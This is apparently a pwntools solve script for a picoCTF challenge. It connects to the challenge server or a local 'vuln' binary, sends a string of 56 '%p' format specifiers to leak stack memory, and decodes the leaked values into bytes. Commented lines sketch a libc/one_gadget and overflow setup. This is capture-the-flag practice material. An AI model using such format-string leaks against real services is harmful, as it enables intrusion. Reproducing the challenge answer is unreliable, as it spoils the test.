#!/usr/bin/env python3
from pwn import *
import monkeyhex
import time
import argparse
import re
from functools import partial
import logging

# Run with ipython3 -i solve.py -- DEBUG <one_gadget>

parser = argparse.ArgumentParser()
parser.add_argument("one_gadget", type=partial(int, base=0), nargs=argparse.REMAINDER)
argparse_args = parser.parse_args()

# context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

# default libc path for some dists is /usr/lib/libc.so.6
# lib = ELF('/lib/x86_64-linux-gnu/libc.so.6') if not args.REMOTE else ELF('libc.so.6')
# lib.sym['binsh'] = lib.offset_to_vaddr(lib.data.find(b'/bin/sh'))
# lib.sym['one_gadget'] = argparse_args.one_gadget[0] if argparse_args.one_gadget else 0
binary = context.binary = ELF('vuln')

def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    c
    """ if commands is None else commands
    res = gdb.attach(p, val)
    pause()
    return res


def new_proc(start_gdb=False, val=None):
    """Start a new process with predefined debug operations"""
    env = dict()
    # env['LD_LIBRARY_PATH'] = os.getcwd()
    # patchelf --set-interpreter "$(ls ld-*.so)" vuln
    # ln -s libc-*.so libc.so.6
    p = process(binary.path, env=env)
    if start_gdb is True:
        attach_gdb(p, val)
    return p

def bnot(n, numbits=context.bits):
    return (1 << numbits) -1 -n

def align(val, align_to):
    return val & bnot(align_to - 1)

def batch(it, sz):
    length = len(it)
    for i in range(0, length, sz):
        yield it[i:i+sz]

p = new_proc(context.log_level == logging.DEBUG) if not args.REMOTE else remote('saturn.picoctf.net', 53547)
# do leak / payload gen here

payload = b''
p.sendlineafter(b'>> ', b''.join([b'%p' for _ in range(56)]))

time.sleep(2)
a = p.read()
leaked_vals = [int(i, 16) for i in a.splitlines()[1].replace(b'(nil)', b'0x0').split(b'0x') if i != b'']
leaked_bytes = b''.join([p32(i) for i in leaked_vals])
print(leaked_bytes)

# leaked = [p32(int(i, 0)) for i in re.findall(b'0x[a-f0-9]+', a)]
#
# leakedbytes = b''.join(leaked)
# print(leakedbytes)

# p.send(cyclic(0x200) + b'\n')
# p.interactive()
